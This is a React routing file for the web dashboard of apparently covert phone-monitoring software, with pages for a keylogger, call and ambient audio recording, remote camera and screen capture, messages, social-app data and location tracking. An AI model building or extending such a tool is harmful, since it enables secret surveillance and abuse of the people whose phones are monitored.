import { BrowserRouter, Routes, Route } from 'react-router-dom';
import { SelectedDeviceProvider } from '@/context/SelectedDeviceContext';
import { Layout } from '@/components/Layout';
import {
  DashboardHome,
  LogsPage,
  ScreenTimePage,
  SocialAppsPage,
  CallsPage,
  CallRecordingPage,
  MessagesPage,
  PhotosPage,
  BrowserHistoryPage,
  KeyloggerPage,
  TrackKeywordsPage,
  WifiLoggerPage,
  AppManagementPage,
  VideoPreviewPage,
  ContactsPage,
  CalendarPage,
  RecordSurroundPage,
  CaptureScreenshotsPage,
  RecordScreenPage,
  LiveScreenPage,
  TakePhotosPage,
  RecordVideoPage,
  LocationsPage,
  AppCallsPage,
  AppAudioPage,
  GeofencePage,
  VideoAppsPage,
  PermissionsCheck,
  IOSDashboard,
  IcloudDashboard,
  WhatsAppDashboard,
  FacebookDashboard,
  SnapchatDashboard,
  TikTokDashboard,
  WhatsAppStatusDashboard,
  TelegramStatusDashboard,
  LineDashboard,
  BindDevicePage,
} from '@/pages';

function App() {
  return (
    <SelectedDeviceProvider>
    <BrowserRouter>
      <Routes>
        <Route path="/bind/:token" element={<BindDevicePage />} />
        <Route path="/" element={<Layout />}>
          <Route index element={<DashboardHome />} />
          <Route path="dashboard" element={<DashboardHome />} />
          <Route path="logs" element={<LogsPage />} />
          <Route path="screen-time" element={<ScreenTimePage />} />
          <Route path="social-apps" element={<SocialAppsPage />} />
          <Route path="calls" element={<CallsPage />} />
          <Route path="call-recording" element={<CallRecordingPage />} />
          <Route path="messages" element={<MessagesPage />} />
          <Route path="photos" element={<PhotosPage />} />
          <Route path="browser-history" element={<BrowserHistoryPage />} />
          <Route path="keylogger" element={<KeyloggerPage />} />
          <Route path="track-keywords" element={<TrackKeywordsPage />} />
          <Route path="wifi-logger" element={<WifiLoggerPage />} />
          <Route path="app-management" element={<AppManagementPage />} />
          <Route path="video-preview" element={<VideoPreviewPage />} />
          <Route path="contacts" element={<ContactsPage />} />
          <Route path="calendar" element={<CalendarPage />} />
          <Route path="record-surround" element={<RecordSurroundPage />} />
          <Route path="capture-screenshots" element={<CaptureScreenshotsPage />} />
          <Route path="record-screen" element={<RecordScreenPage />} />
          <Route path="live-screen" element={<LiveScreenPage />} />
          <Route path="take-photos" element={<TakePhotosPage />} />
          <Route path="record-video" element={<RecordVideoPage />} />
          <Route path="locations" element={<LocationsPage />} />
          <Route path="app-calls" element={<AppCallsPage />} />
          <Route path="app-audio" element={<AppAudioPage />} />
          <Route path="geofence" element={<GeofencePage />} />
          <Route path="video-apps" element={<VideoAppsPage />} />
          <Route path="permissions-check" element={<PermissionsCheck />} />
          <Route path="ios-dashboard" element={<IOSDashboard />} />
          <Route path="icloud-dashboard" element={<IcloudDashboard />} />
          <Route path="whatsapp-dashboard" element={<WhatsAppDashboard />} />
          <Route path="facebook-dashboard" element={<FacebookDashboard />} />
          <Route path="snapchat-dashboard" element={<SnapchatDashboard />} />
          <Route path="tiktok-dashboard" element={<TikTokDashboard />} />
          <Route path="whatsapp-status-dashboard" element={<WhatsAppStatusDashboard />} />
          <Route path="telegram-status-dashboard" element={<TelegramStatusDashboard />} />
          <Route path="line-dashboard" element={<LineDashboard />} />
        </Route>
      </Routes>
    </BrowserRouter>
    </SelectedDeviceProvider>
  );
}

export default App;
